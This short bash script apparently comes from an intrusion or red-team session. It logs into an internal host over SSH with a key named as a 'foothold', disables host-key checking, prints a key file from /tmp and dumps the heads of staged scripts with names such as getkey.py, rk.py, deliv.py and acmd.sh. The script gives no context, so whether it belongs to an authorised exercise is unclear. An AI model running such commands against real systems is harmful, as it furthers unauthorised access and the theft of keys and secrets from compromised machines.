#!/bin/bash
S="ssh -o StrictHostKeyChecking=no -o BatchMode=yes -i ~/.ssh/keplerops-foothold -p 2222 rowan@10.50.13.180"
echo "===== arwc_key ====="
$S 'cat /tmp/arwc_key'
echo "===== relevant /tmp scripts ====="
$S 'for f in /tmp/scan_conn.py /tmp/rk.py /tmp/getkey.py /tmp/deliv.py /tmp/dns.sh /tmp/dns2.sh /tmp/acmd.sh /tmp/scan2.py /tmp/meta.json /tmp/doc.json /tmp/ex.json /tmp/ent.json; do echo "##### $f"; head -c 1500 "$f"; echo; done'
